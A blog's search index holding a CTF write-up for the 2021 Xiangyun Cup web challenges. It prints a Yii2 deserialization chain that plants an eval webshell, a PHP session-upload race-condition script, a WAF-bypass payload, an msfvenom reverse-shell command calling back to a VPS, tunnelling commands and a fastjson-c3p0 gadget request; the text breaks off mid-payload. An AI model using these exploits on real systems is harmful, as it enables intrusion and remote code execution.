<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2021祥云杯</title>
      <link href="article/2021xyb/"/>
      <url>article/2021xyb/</url>
      
        <content type="html"><![CDATA[<p>记录一下，祥云杯的wp</p><a id="more"></a><p>个人的最好成绩，web差一题ak了，当然题目也很简单就是啦。我主要是负责web方面的解题，队伍的wp也会在下面放出。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h3><p>题目打开写的很清楚，较新的链子，看了下是<a href="https://xz.aliyun.com/t/9948">yii2.0.42的1day漏洞</a></p><img src="/article/2021xyb/image-20210903132707299.png" class="" title="image-20210903132707299" loading="lazy"><p>原理不过多分析了，学弟在赛后写了个<a href="https://lxscloud.top/2021/08/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E6%9E%84%E9%80%A0POP%E9%93%BE/">分析</a>挺详细的，可以看看（学弟tql）</p><p>Exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>AppendStream</span><span class="token punctuation">;</span>    <span class="token keyword">class</span>  <span class="token class-name">RunProcess</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$output</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">processes</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AppendStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jiang'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name">DefaultGenerator</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$default</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">default</span> <span class="token operator">=</span> <span class="token variable">$default</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">AppendStream</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$streams</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$seekable</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">streams</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CachingStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">CachingStream</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$remoteStream</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">remoteStream</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token boolean constant">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">stream</span><span class="token operator">=</span><span class="token keyword">new</span>  <span class="token class-name">PumpStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">PumpStream</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$source</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$buffer</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">buffer</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'j'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"closure/autoload.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//            $a = function()&#123;phpinfo();&#125;;</span>            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token variable">$a</span> <span class="token operator">=</span> \<span class="token package">Opis<span class="token punctuation">\</span>Closure<span class="token punctuation">\</span>serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>直接可以命令执行</p><img src="/article/2021xyb/image.png" class="" title="image" loading="lazy"><p>直接拿flag</p><hr><h3 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h3><p><small>这题是完全是个人凭感觉自己做出来的，很欣慰，可惜没抢到血分</small></p><p>界面很花哨，随便登陆即可</p><p>看一下登陆的包</p><p>要跟随一个302跳转才能进去，检测网址过滤了file、flag关键字。</p><p>输入网址发现进了check2.php，根据报错得知是<code>file_get_contents($_POST[&#39;url1&#39;]);</code>这样的形式根据扫目录得到的结果，存在admin目录</p><p>直接访问会被403，所以利用检测网站打ssrf，检测然后预览看，打<code>http://127.0.0.1/admin/</code>，可以发现开启了目录遍历</p><img src="/article/2021xyb/image-20210903134546557.png" class="" title="image-20210903134546557" loading="lazy"><p>发现目录下有<code>include123.php</code>文件，读取得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$u</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token double-quoted-string string">"|file_put_content|file_get_content|fwrite|curl|system|eval|assert"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token punctuation">.</span><span class="token operator">=</span><span class="token double-quoted-string string">"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token punctuation">.</span><span class="token operator">=</span><span class="token double-quoted-string string">"|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token punctuation">.</span><span class="token operator">=</span><span class="token double-quoted-string string">"|file|dict|gopher"</span><span class="token punctuation">;</span><span class="token comment">//累了累了，饮茶先</span><span class="token variable">$vpattern</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"|"</span><span class="token punctuation">,</span><span class="token variable">$pattern</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$vpattern</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$vpattern</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span> <span class="token double-quoted-string string">"/<span class="token interpolation"><span class="token variable">$value</span></span>/i"</span><span class="token punctuation">,</span> <span class="token variable">$u</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"检测到恶意字符"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>出题人真的苟，这么长一段黑名单，审查源码，可以读<code>/etc/passwd</code> 。但是ban了很多函数看上去根本不是想给机会rce。</p><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>仔细观察发现</p><p> 1.文件包含include </p><p> 2.u变量可控 </p><p> 3.可以任意文件读取使用了session，所以默认<code>/tmp/sess_id</code> 会存有session的信息，读取id对应的session发现存在</p><p>于是想到<code>PHP_SESSION_UPLOAD_PROGRESS漏洞</code></p><blockquote><p>php的session.use_strict_mode默认值为0，此时用户是可以自己定义Session ID的。<br>比如，我们在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag（还有可能在 /var/lib/php/session里面）。即使此时用户没有初始化Session，PHP也会自动初始化Session。<br>产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p><p>如果我们在其中插入一句话木马，它就会被写入sess_xxx里</p><img src="/article/2021xyb/image-20210903135456923.png" class="" title="image-20210903135456923" loading="lazy"><p>但是默认情况下，session.upload_progress.cleanup是开启的，一旦读取了所有POST数据，它就会清除进度信息，那就没用了，他读取完了会清除数据，那我们的代码就执行不了。</p><p>所以需要使用条件竞争，要赶在他还没有读取完post包上传的数据的时候就访问到这个sess_xxx文件，执行里面的代码。</p></blockquote><p>直接从网上找exp修改，目的就是对个网页<code>check2.php</code>进行上传，这里填充了一堆<code>a</code>，让它去占用时间给我们条件竞争创造更多机会，利用ssrf打<code>include123.php</code>，参数<code>u</code>包含session文件来命令执行</p><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 8月 21, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> io<span class="token keyword">import</span> threadingbaseurl <span class="token operator">=</span> <span class="token string">"http://eci-2zefgf3p1ushlimyl69v.cloudeci1.ichunqiu.com/"</span>sessid <span class="token operator">=</span> <span class="token string">'gyy'</span>PAYLOAD <span class="token operator">=</span> <span class="token string">'&lt;?php eval(system(\'sh /getflag.sh\'));?>'</span><span class="token keyword">def</span> <span class="token function">getdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"url1"</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1/admin/include123.php?u=/tmp/sess_"</span> <span class="token operator">+</span> sessid<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token comment"># cookies = "PHPSESSID=123".split("; ")</span>    <span class="token comment"># cookie = &#123;&#125;</span>    <span class="token comment"># for i in cookies:</span>    <span class="token comment">#     cookie[i.split("=")[0]] = i.split("=")[1]</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>baseurl <span class="token operator">+</span> <span class="token string">"check2.php"</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>    text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baseurl <span class="token operator">+</span> <span class="token string">"preview.php"</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>    <span class="token keyword">return</span> text<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>baseurl <span class="token operator">+</span> <span class="token string">"check2.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> PAYLOAD<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'123.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>                            timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> getdir<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'123.txt'</span> <span class="token keyword">in</span> resp<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span>            event<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+++++++++++++]retry"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>打了phpinfo发现可行</p><img src="/article/2021xyb/upload_22a92f54497d73c2f65e6f34c6dba9b6.png" class="" title="img" loading="lazy"><p>继续</p><img src="/article/2021xyb/upload_00c55368090301064d2ed35507ff9685.png" class="" title="img" loading="lazy"><p>读取根目录下文件</p><img src="/article/2021xyb/upload_4e9b7ae5eef86856696a48d5cceda801.png" class="" title="img" loading="lazy"><p>执行<code>/getflag.sh</code></p><img src="/article/2021xyb/image-20210903140536843.png" class="" title="image-20210903140536843" loading="lazy"><p>拿到flag</p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>赛后和 @h3h3QAQ 师傅聊了下，发现waf是可以绕过的（tqltql）</p><p>直接用反斜线绕过,payload:<code>./?u=&lt;?=system(&#39;gerf\lag.sh&#39;);?&gt;</code></p><img src="/article/2021xyb/image-20210903140902197.png" class="" title="image-20210903140902197" loading="lazy"><p>然后预览得到flag</p><img src="/article/2021xyb/image-20210903141054059.png" class="" title="image-20210903141054059" loading="lazy"><p>太猛了</p><hr><h3 id="层层穿透"><a href="#层层穿透" class="headerlink" title="层层穿透"></a>层层穿透</h3><p>Apache Flink老洞了<a href="https://www.freebuf.com/vuls/220252.html">https://www.freebuf.com/vuls/220252.html</a></p><p>利用msf生成个jar包</p><p><code> msfvenom -p java/shell_reverse_tcp LHOST=vps LPORT=1234 -f jar&gt;/media/psf/Home/Downloads/shell.jar</code></p><p>直接upload然后submit上线</p><p>题目说本机对应内网<code>10.10.1.12</code>，扫了<code>10.10.1.11</code> 的8080端口好像有东西</p><h4 id="利用ew内网穿透"><a href="#利用ew内网穿透" class="headerlink" title="利用ew内网穿透"></a>利用ew内网穿透</h4><p>利用ew内网穿透出来，放公网服务器，在靶机上用curl -O保存ew文件，然后执行，公网vps上转发流量</p><p>本人的描述可能有错误或不清楚的地方，还请师傅们多多指教</p><h5 id="公网主机"><a href="#公网主机" class="headerlink" title="公网主机"></a>公网主机</h5><p>如下，执行<code>./ew -s lcx_listen -l 1080 -e 8888</code> 将本机1080的流量转交到8888</p><img src="/article/2021xyb/image-20210903141554948.png" class="" title="image-20210903141554948" loading="lazy"><hr><h5 id="边界主机"><a href="#边界主机" class="headerlink" title="边界主机"></a>边界主机</h5><p>执行<code>./ew -s lcx_slave -d [vps] -e [port] -f 10.10.1.11 -g 8080</code></p><p>利用可控的内网主机打通<code>10.10.1.11:8080</code> 与我们公网vps的通讯隧道</p><img src="/article/2021xyb/image-20210903142010256.png" class="" title="image-20210903142010256" loading="lazy"><h4 id="网络状况描述"><a href="#网络状况描述" class="headerlink" title="网络状况描述"></a>网络状况描述</h4><p>· 本机：即我的攻击电脑</p><p>· 可控的公网IP主机：即我的在公网的服务器</p><p>· A主机：题目给出的靶机，有公网IP：47.104.135.101，内网IP：10.10.1.12，可访问B主机</p><p>· B主机：题目内网的目标靶机，8080端口有东西</p><p>目标：访问B主机的8080端口</p><pre class="language-none"><code class="language-none">                    一台可控公网IP主机                    可控内网主机A                      主机B+---------+     +----------------------+    |    +-------------------------+      +-------------------+|   本机   | -&gt;&gt; | 1080 -&gt;  vps -&gt; 8888 |  防火墙  | &lt;--    10.10.1.12   --&gt; | -&gt;&gt; | 8080 -&gt; 10.10.1.11 |+---------+     +----------------------+    |    +-------------------------+      +-------------------+</code></pre><hr><p>访问到了<code>10.10.1.11:8080</code></p><p>将题目附件的<code>web.jar</code> 反编译下，拿到了源码。</p><p>首先在<code>/doLogin</code> 路由登陆，审查源码得知 <code>用户名/密码</code> 分别为 <code>admin/123456</code> </p><p>然后拿到cookie转去<code>/admin/test</code>路由</p><p>根据源码，这里会先过waf然后解析json，而且json长度要大于20000</p><p>在github上找到了一份payload：<a href="https://github.com/depycode/fastjson-c3p0">https://github.com/depycode/fastjson-c3p0</a></p><p>fastjson-c3p0不出网回显利用，直接生成payload，然后复制几遍达到长度要求，改Content-Type为json，在header中添加cmd命令，获得flag</p><img src="/article/2021xyb/4D49F7AE6BBF284F438626001021582E.jpg" class="" title="4D49F7AE6BBF284F438626001021582E" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">POST &#x2F;admin&#x2F;test HTTP&#x2F;1.1Host: 49.234.89.193:1080Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: closeCookie: JSESSIONID&#x3D;20337391D87A73966C86012AB6114638;Content-Type: application&#x2F;jsoncmd: cat &#x2F;flagContent-Length: 79583&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000103F400000000000027372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870707400136765744F757470757450726F7065727469657370737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017371007E000B3F4000000000000C770800000010000000017372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E00084C00055F6E616D6571007E00074C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000000DCFCAFEBABE0000003400CD0A0014005F090033006009003300610700620A0004005F09003300630A006400650A003300660A000400670A000400680A0033006907006A0A0014006B0A0012006C08006D0B000C006E08006F0700700A001200710700720A007300740700750700760700770800780A0079007A0A0018007B08007C0A0018007D08007E08007F0800800B001600810700820A008300840A008300850A008600870A002200880800890A0022008A0A0022008B0A008C008D0A008C008E0A0012008F0A009000910A009000920A001200930A003300940700950A00120096070097010001680100134C6A6176612F7574696C2F486173685365743B0100095369676E61747572650100274C6A6176612F7574696C2F486173685365743C4C6A6176612F6C616E672F4F626A6563743B3E3B010001720100274C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B010001700100284C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100204C79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F313B01000169010015284C6A6176612F6C616E672F4F626A6563743B295A0100036F626A0100124C6A6176612F6C616E672F4F626A6563743B01000D537461636B4D61705461626C65010016284C6A6176612F6C616E672F4F626A6563743B492956010001650100154C6A6176612F6C616E672F457863657074696F6E3B010008636F6D6D616E64730100135B4C6A6176612F6C616E672F537472696E673B0100016F01000564657074680100014907007607004C070072010001460100017101000D6465636C617265644669656C640100194C6A6176612F6C616E672F7265666C6563742F4669656C643B01000573746172740100016E0100114C6A6176612F6C616E672F436C6173733B07007007009807009901000A536F7572636546696C65010010436F6D6D6F6E4563686F312E6A6176610C003C003D0C003800390C003A003B0100116A6176612F7574696C2F486173685365740C0034003507009A0C009B009C0C005300480C009D00440C009E00440C004300440100256A617661782F736572766C65742F687474702F48747470536572766C6574526571756573740C009F00A00C00A100A2010003636D640C00A300A401000B676574526573706F6E736501000F6A6176612F6C616E672F436C6173730C00A500A60100106A6176612F6C616E672F4F626A6563740700A70C00A800A90100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73650100136A6176612F6C616E672F457863657074696F6E0100106A6176612F6C616E672F537472696E670100076F732E6E616D650700AA0C00AB00A40C00AC00AD01000357494E0C009D00AE0100022F630100072F62696E2F73680100022D630C00AF00B00100116A6176612F7574696C2F5363616E6E65720700B10C00B200B30C00B400B50700B60C00B700B80C003C00B90100025C410C00BA00BB0C00BC00AD0700BD0C00BE00BF0C00C0003D0C00C100C20700990C00C300C40C00C500C60C00C700C80C003A00480100135B4C6A6176612F6C616E672F4F626A6563743B0C00C900A001001E79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F3101001A5B4C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C640100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010008636F6E7461696E73010003616464010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B010010697341737369676E61626C6546726F6D010014284C6A6176612F6C616E672F436C6173733B295A01